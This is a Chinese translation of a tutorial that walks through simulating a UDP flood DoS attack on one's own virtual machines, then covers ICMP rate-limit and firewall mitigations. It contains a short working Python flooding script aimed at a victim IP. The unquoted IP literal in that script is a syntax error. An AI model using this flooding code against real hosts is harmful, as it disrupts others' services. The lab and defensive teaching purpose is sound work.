> * 原文地址：[How to simulate a UDP Flood DoS attack on your computer](https://levelup.gitconnected.com/how-to-simulate-a-udp-flood-dos-attack-on-your-computer-863b40c44f3f)
> * 原文作者：[RiccardoM](https://medium.com/@riccardom)
> * 译文出自：[掘金翻译计划](https://github.com/xitu/gold-miner)
> * 本文永久链接：[https://github.com/xitu/gold-miner/blob/master/article/2020/how-to-simulate-a-udp-flood-dos-attack-on-your-computer.md](https://github.com/xitu/gold-miner/blob/master/article/2020/how-to-simulate-a-udp-flood-dos-attack-on-your-computer.md)
> * 译者：[chaingangway](https://github.com/chaingangway)
> * 校对者：[shixi-li](https://github.com/shixi-li)、[司徒公子](https://github.com/stuchilde)

# 如何在自己的计算机上模拟 UDP 洪水 DoS 攻击

![](https://cdn-images-1.medium.com/max/12048/0*5IXgILaawtazZ2Tx)

**免责声明：以下教程仅用于教学目的。您只能对自己的计算机执行攻击**

UDP 洪水攻击能让服务器拒绝服务，攻击者向目标服务器发送大量 **UDP**（用户数据报文协议）数据包，以压垮服务器处理和响应传入流量的能力。

攻击者将数据包发送到服务器 IP 地址的随机端口。当服务器收到数据包时：

1. 检查是否有程序监听该端口。
2. 如果发现没有程序监听；大部分情况都是这样，因为目标端口是随机的。
3. 返回 **ICMP Destination Unreachable** 的数据包。

攻击者的 IP 地址可以伪装，以防止 ICMP 响应包的身份识别和自身资源饱和。

## 初始化

为了模拟这种攻击，您需要两台虚拟机。网卡必须配置为在子网中并且有自己的地址。我使用的是 VirtualBox 中非常轻量级的两个 BunsenLabs 实例。它们以桥接模式配置网卡。下面是对每个虚拟机的要求：

* **攻击者**的虚拟机需要安装 python 3
* **目标服务器**需要安装 3.7 及以上版本的 python

#### 服务器端配置

我们将运行一个简单的 HTTP 服务器，以验证服务器受到攻击时性能是否下降。下面是用 Python 编写的服务器端程序。

```py
import sys
import time
import random
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler

class DefaultHTTPHandler(BaseHTTPRequestHandler):

  def do_GET(self):
    self.send_response(200)
    self.send_header('Content-type', 'text/plain')
    self.send_header("Cache-Control", "no-cache")
    self.end_headers()

    n = random.randint(1e7,1e8)
    self.wfile.write((("{} is " + ("" if is_prime(n) else "not ") + "a prime number").format(n)).encode("utf-8"))

def base_http_server_start(address="0.0.0.0", port=80):
    handler = DefaultHTTPHandler
    address = (address, port)
    server = ThreadingHTTPServer(address, handler, bind_and_activate=False)
    server.server_bind()
    server.server_activate()
    server.serve_forever()

def is_prime(num):
    res = True
    for i in range(2, num - 1):
        if num % i == 0:
            res = False
    return res

if __name__ == '__main__':
    print("Starting HTTP server on port 80")
    base_http_server_start()
```

通过地址 localhost: 80 访问服务器。在这个服务器程序中，我们生成了一个非常大的随机数，并故意用非常低效的方法检验它是否为质数。通过这种机制，我们在重新加载浏览器页面时就能大致估计服务器的响应时间。响应时间因硬件的计算能力而异，平均值在 5-10 秒左右。

#### 攻击脚本

我们用下面的 Python 脚本执行攻击，这里用到了 socket。

```py
import time
import socket
import random
import sys

victim_ip = 192.168.1.10
duration = 60 # in seconds

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

msg = bytes(random.getrandbits(10))
timeout = time.time() + duration
sent_packets = 0

while time.time() < timeout:
  victim_port = random.randint(1025, 65356)
  sock.sendto(msg, (victim_ip, victim_port))
  sent_packets += 1
```

在脚本中，我们可以指定目标的 IP 地址和攻击的持续时间。如上所述，每次发送数据包时，我们都会选择一个不同的端口。

## 攻击

要执行攻击，我们首先需要运行服务器并使用上述方法检查其性能。接下来，在攻击者的虚拟机中，运行执行攻击的脚本。当服务器受到攻击时，由于其忙于处理传入流量并返回 ICMP Destination Unreachable 数据包，我们可以看到其 CPU 使用率在增加。

然后，我们来重新加载浏览器页面并计算服务器的响应时间。很显然看到服务器性能已极具下降。响应时间至少应为正常情况下的两倍。

## 缓解

#### Linux 设置

想缓解 UDP 洪水攻击很难。但是我们可以更改操作系统每秒发送的 ICMP 数据包的数量。我们在Linux中使用这两个命令，例如：

```bash
sudo sysctl -w net.ipv4.icmp_ratelimit=0
sudo sysctl -w net.ipv4.icmp_msgs_per_sec=1000
```

第一条命令让 ICMP 响应的速率仅能通过第二条命令的参数来设置。因此，在这种情况下，使用第二个命令，我们就能设置 ICMP 消息的速率为每秒 1000 条 。

我们可以很容易地验证这一点，方法是对服务器持续攻击 10 秒钟，并在服务器上使用 Wireshark 来拦截响应的 ICMP 数据包。我们可以看到在 10s 内大约发送了 10000 个 ICMP 数据包，这是对的，因为，我们将速率设置为每秒 1000 个数据包。

![10.000 packets captured with Wireshark during a 10 seconds attack](https://cdn-images-1.medium.com/max/2000/1*Kb3xNdtJxxD0L87W9i3IJg.png)

我们可以尝试更改此参数，并使用 Wireshark 检查 10 秒钟内发送的数据包数量如何变化。例如，设置速率为每秒 1 条消息，我们可以捕获大约 10 条消息。

```bash
sudo sysctl -w net.ipv4.icmp_msgs_per_sec=1
```

![10 packets captured with Wireshark during a 10 seconds attack](https://cdn-images-1.medium.com/max/2000/1*3MVskJJFtm4wKB4kT5GiYg.png)

为这些参数设置最佳值是个难点。因为最佳值取决于我们的硬件，应用程序以及与服务器交互的平均流量。如果我们减少每秒发送的响应数，虽然能减少服务器的负载，但这只是丢弃了更多传入的请求，而没有发送 ICMP 响应包。通过减少参数的值，我们可能会拒绝合法的请求，而没有处理真实用户的流量，这会有更大的风险。因此，我们要有一种折衷的办法。

#### 防火墙

我们还可以使用防火墙来抵御这种攻击。防火墙可以在 UDP 数据包到达服务器之前将其阻止。这样就不会耗费服务器资源。但是，防火墙本身也容易受到此类攻击：它们必须处理传入的流量，并且可能在攻击过程中成为瓶颈。此外，如果我们使用的是有状态的防火墙，虽然可以轻松地阻止来自同一 IP 地址的攻击，但是如果攻击者使用了 IP 欺骗，防火墙的状态表可能会塞满，可用内存将被耗尽。因此，防火墙也不是终极解决方案。

## 结论

在本文中，我们通过几个简单的步骤模拟攻击，来帮助我们更好地了解其工作原理。您还可以更详细地研究应对攻击的缓解措施，尝试使用不同的参数来配置服务器。这个过程也很有趣，因为这是一种简单而强大的攻击：如上所述，我们很难采取有效的对策来阻止它。如果您对更复杂的基于 UDP 的攻击感兴趣，请查看[这个](https://levelup.gitconnected.com/how-to-simulate-a-ntp-amplification-dos-attack-on-your-computer-72b3c6f60eb7)故事，在此我解释了如何利用 NTP 服务器来扩大流量，让受攻击的服务器带宽饱和。

> 如果发现译文存在错误或其他需要改进的地方，欢迎到 [掘金翻译计划](https://github.com/xitu/gold-miner) 对译文进行修改并 PR，也可获得相应奖励积分。文章开头的 **本文永久链接** 即为本文在 GitHub 上的 MarkDown 链接。

---

> [掘金翻译计划](https://github.com/xitu/gold-miner) 是一个翻译优质互联网技术文章的社区，文章来源为 [掘金](https://juejin.im) 上的英文分享文章。内容覆盖 [Android](https://github.com/xitu/gold-miner#android)、[iOS](https://github.com/xitu/gold-miner#ios)、[前端](https://github.com/xitu/gold-miner#前端)、[后端](https://github.com/xitu/gold-miner#后端)、[区块链](https://github.com/xitu/gold-miner#区块链)、[产品](https://github.com/xitu/gold-miner#产品)、[设计](https://github.com/xitu/gold-miner#设计)、[人工智能](https://github.com/xitu/gold-miner#人工智能)等领域，想要查看更多优质译文请持续关注 [掘金翻译计划](https://github.com/xitu/gold-miner)、[官方微博](http://weibo.com/juejinfanyi)、[知乎专栏](https://zhuanlan.zhihu.com/juejinfanyi)。
